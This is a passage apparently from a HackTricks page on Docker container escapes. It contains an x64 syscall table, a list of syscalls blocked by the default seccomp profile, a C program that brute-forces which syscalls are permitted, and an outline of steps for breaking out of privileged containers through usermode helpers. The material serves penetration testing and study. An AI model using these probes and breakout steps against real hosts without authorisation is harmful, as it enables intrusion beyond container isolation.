| sethostname | 170 |
| setdomainname | 171 |
| iopl | 172 |
| ioperm | 173 |
| create_module | 174 |
| init_module | 175 |
| delete_module | 176 |
| get_kernel_syms | 177 |
| query_module | 178 |
| quotactl | 179 |
| nfsservctl | 180 |
| getpmsg | 181 |
| putpmsg | 182 |
| afs_syscall | 183 |
| tuxcall | 184 |
| security | 185 |
| gettid | 186 |
| readahead | 187 |
| setxattr | 188 |
| lsetxattr | 189 |
| fsetxattr | 190 |
| getxattr | 191 |
| lgetxattr | 192 |
| fgetxattr | 193 |
| listxattr | 194 |
| llistxattr | 195 |
| flistxattr | 196 |
| removexattr | 197 |
| lremovexattr | 198 |
| fremovexattr | 199 |
| tkill | 200 |
| time | 201 |
| futex | 202 |
| sched_setaffinity | 203 |
| sched_getaffinity | 204 |
| set_thread_area | 205 |
| io_setup | 206 |
| io_destroy | 207 |
| io_getevents | 208 |
| io_submit | 209 |
| io_cancel | 210 |
| get_thread_area | 211 |
| lookup_dcookie | 212 |
| epoll_create | 213 |
| epoll_ctl_old | 214 |
| epoll_wait_old | 215 |
| remap_file_pages | 216 |
| getdents64 | 217 |
| set_tid_address | 218 |
| restart_syscall | 219 |
| semtimedop | 220 |
| fadvise64 | 221 |
| timer_create | 222 |
| timer_settime | 223 |
| timer_gettime | 224 |
| timer_getoverrun | 225 |
| timer_delete | 226 |
| clock_settime | 227 |
| clock_gettime | 228 |
| clock_getres | 229 |
| clock_nanosleep | 230 |
| exit_group | 231 |
| epoll_wait | 232 |
| epoll_ctl | 233 |
| tgkill | 234 |
| utimes | 235 |
| vserver | 236 |
| mbind | 237 |
| set_mempolicy | 238 |
| get_mempolicy | 239 |
| mq_open | 240 |
| mq_unlink | 241 |
| mq_timedsend | 242 |
| mq_timedreceive | 243 |
| mq_notify | 244 |
| mq_getsetattr | 245 |
| kexec_load | 246 |
| waitid | 247 |
| add_key | 248 |
| request_key | 249 |
| keyctl | 250 |
| ioprio_set | 251 |
| ioprio_get | 252 |
| inotify_init | 253 |
| inotify_add_watch | 254 |
| inotify_rm_watch | 255 |
| migrate_pages | 256 |
| openat | 257 |
| mkdirat | 258 |
| mknodat | 259 |
| fchownat | 260 |
| futimesat | 261 |
| newfstatat | 262 |
| unlinkat | 263 |
| renameat | 264 |
| linkat | 265 |
| symlinkat | 266 |
| readlinkat | 267 |
| fchmodat | 268 |
| faccessat | 269 |
| pselect6 | 270 |
| ppoll | 271 |
| unshare | 272 |
| set_robust_list | 273 |
| get_robust_list | 274 |
| splice | 275 |
| tee | 276 |
| sync_file_range | 277 |
| vmsplice | 278 |
| move_pages | 279 |
| utimensat | 280 |
| epoll_pwait | 281 |
| signalfd | 282 |
| timerfd_create | 283 |
| eventfd | 284 |
| fallocate | 285 |
| timerfd_settime | 286 |
| timerfd_gettime | 287 |
| accept4 | 288 |
| signalfd4 | 289 |
| eventfd2 | 290 |
| epoll_create1 | 291 |
| dup3 | 292 |
| pipe2 | 293 |
| inotify_init1 | 294 |
| preadv | 295 |
| pwritev | 296 |
| rt_tgsigqueueinfo | 297 |
| perf_event_open | 298 |
| recvmmsg | 299 |
| fanotify_init | 300 |
| fanotify_mark | 301 |
| prlimit64 | 302 |
| name_to_handle_at | 303 |
| open_by_handle_at | 304 |
| clock_adjtime | 305 |
| syncfs | 306 |
| sendmmsg | 307 |
| setns | 308 |
| getcpu | 309 |
| process_vm_readv | 310 |
| process_vm_writev | 311 |
| kcmp | 312 |
| finit_module | 313 |
| sched_setattr | 314 |
| sched_getattr | 315 |
| renameat2 | 316 |
| seccomp | 317 |
| getrandom | 318 |
| memfd_create | 319 |
| kexec_file_load | 320 |
| bpf | 321 |
| execveat | 322 |
| userfaultfd | 323 |
| membarrier | 324 |
| mlock2 | 325 |
| copy_file_range | 326 |
| preadv2 | 327 |
| pwritev2 | 328 |
| pkey_mprotect | 329 |
| pkey_alloc | 330 |
| pkey_free | 331 |
| statx | 332 |
| io_pgetevents | 333 |
| rseq | 334 |
| pidfd_send_signal | 424 |
| io_uring_setup | 425 |
| io_uring_enter | 426 |
| io_uring_register | 427 |
| open_tree | 428 |
| move_mount | 429 |
| fsopen | 430 |
| fsconfig | 431 |
| fsmount | 432 |
| fspick | 433 |
| pidfd_open | 434 |
| clone3 | 435 |
| close_range | 436 |
| openat2 | 437 |
| pidfd_getfd | 438 |
| faccessat2 | 439 |
| process_madvise | 440 |
| epoll_pwait2 | 441 |
| mount_setattr | 442 |
| landlock_create_ruleset | 444 |
| landlock_add_rule | 445 |
| landlock_restrict_self | 446 |

{% endtab %}
```
0x029 -- pivot_root
0x059 -- acct
0x069 -- init_module
0x06a -- delete_module
0x074 -- syslog
0x09d -- setsid
0x0a1 -- sethostname
0x0a2 -- setdomainname
0x0aa -- settimeofday
0x0e0 -- swapon
0x0e1 -- swapoff
0x106 -- fanotify_init
0x109 -- open_by_handle_at
0x111 -- finit_module
0x118 -- bpf
```
{% tab title="syscall_bf.c" %}
````c
// From a conversation I had with @arget131
// Fir bfing syscalss in x64

#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>

int main()
{
for(int i = 0; i < 333; ++i)
{
if(i == SYS_rt_sigreturn) continue;
if(i == SYS_select) continue;
if(i == SYS_pause) continue;
if(i == SYS_exit_group) continue;
if(i == SYS_exit) continue;
if(i == SYS_clone) continue;
if(i == SYS_fork) continue;
if(i == SYS_vfork) continue;
if(i == SYS_pselect6) continue;
if(i == SYS_ppoll) continue;
if(i == SYS_seccomp) continue;
if(i == SYS_vhangup) continue;
if(i == SYS_reboot) continue;
if(i == SYS_shutdown) continue;
if(i == SYS_msgrcv) continue;
printf("Probando: 0x%03x . . . ", i); fflush(stdout);
if((syscall(i, NULL, NULL, NULL, NULL, NULL, NULL) < 0) && (errno == EPERM))
printf("Error\n");
else
printf("OK\n");
}
}
```

````
{% endtab %}
{% endtabs %}

### Container Breakout through Usermode helper Template

If you are in **userspace** (**no kernel exploit** involved) the way to find new escapes mainly involve the following actions (these templates usually require a container in privileged mode):

* Find the **path of the containers filesystem** inside the host
* You can do this via **mount**, or via **brute-force PIDs** as explained in the second release\_agent exploit
* Find some functionality where you can **indicate the path of a script to be executed by a host process (helper)** if something happens
* You should be able to **execute the trigger from inside the host**
* You need to know where the containers files are located inside the host to indicate a script you write inside the host
* Have **enough capabilities and disabled protections** to be able to abuse that functionality
* You might need to **mount things** o perform **special privileged actions** you cannot do in a default docker container

## References

* [https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB](https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB)
* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)
* [https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
* [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
